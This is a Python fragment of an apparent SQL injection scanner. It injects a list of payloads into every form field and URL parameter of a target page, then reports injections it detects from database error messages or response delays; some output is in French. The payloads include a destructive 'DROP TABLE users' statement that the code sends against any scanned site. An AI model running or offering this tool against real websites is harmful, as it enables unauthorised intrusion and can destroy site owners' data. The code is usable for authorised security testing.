import requests
import urllib.parse
from bs4 import BeautifulSoup
import random
import time

# Enhanced payloads for different types of SQL injection
payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "'; WAITFOR DELAY '0:0:5'; --",
    "' UNION SELECT null, null, null, null --"
]

def check_sqli_form(self, page=None):
    if page is None:
        page = self.url
    source = self.get_page_source(page)
    if source is not None:
        soup = BeautifulSoup(source, "html.parser")
        forms_list = soup.find_all("form")

        ret = ""
        for form in forms_list:
            form_action = form.get("action")
            form_method = form.get("method")
            target_url = urllib.parse.urljoin(page, form_action)

            input_list = form.find_all("input")
            for payload in payloads:
                param_list = {}
                for input_ in input_list:
                    input_name = input_.get("name")
                    input_type = input_.get("type")
                    input_value = input_.get("value")

                    if "?" + input_name not in target_url and "&" + input_name not in target_url:
                        if input_type == "text" or input_type == "password":
                            param_list[input_name] = payload
                        elif input_value is not None:
                            param_list[input_name] = input_value
                        else:
                            param_list[input_name] = ""

                if form_method.lower() == "get":
                    res = self.session.get(target_url, params=param_list)
                elif form_method.lower() == "post":
                    res = self.session.post(target_url, data=param_list)

                if any(error in res.text for error in ["You have an error in your SQL syntax;", "SQL error", "database error"]):
                    print("INJECTION SQL DETECTEE DANS FORM : " + res.url + " (" + form_action + ")")
                    ret = ret + "INJECTION SQL DETECTEE DANS FORM : " + res.url + " (" + form_action + ")\n"
                    break  # Exit the loop once a vulnerability is found

        return ret

def check_sqli_link(self, page=None):
    if page is None:
        page = self.url
    ret = ""
    for payload in payloads:
        injected_page = page.replace("=", "=" + urllib.parse.quote(payload))
        res = self.session.get(injected_page)
        if any(error in res.text for error in ["You have an error in your SQL syntax;", "SQL error", "database error"]):
            print("INJECTION SQL DETECTEE DANS LIEN : " + res.url)
            ret = ret + "INJECTION SQL DETECTEE DANS LIEN : " + res.url + "\n"
            break  # Exit the loop once a vulnerability is found
        # Check for time-based SQL injection
        start_time = time.time()
        res = self.session.get(injected_page)
        if time.time() - start_time > 5:
            print("POTENTIAL TIME-BASED SQL INJECTION DETECTED IN LINK : " + res.url)
            ret = ret + "POTENTIAL TIME-BASED SQL INJECTION DETECTED IN LINK : " + res.url + "\n"
            break  # Exit the loop once a vulnerability is found

    return ret
